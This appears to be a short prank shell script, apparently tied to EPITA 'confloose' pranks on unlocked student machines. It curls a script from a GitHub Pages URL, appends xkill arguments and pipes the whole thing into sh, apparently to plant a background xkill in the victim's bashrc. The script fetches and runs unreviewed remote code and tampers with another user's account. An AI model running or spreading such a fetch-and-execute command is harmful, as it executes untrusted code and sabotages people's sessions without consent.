#!/bin/sh

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "xkill" "'xkill 1>&2>/dev/null &'" | sh
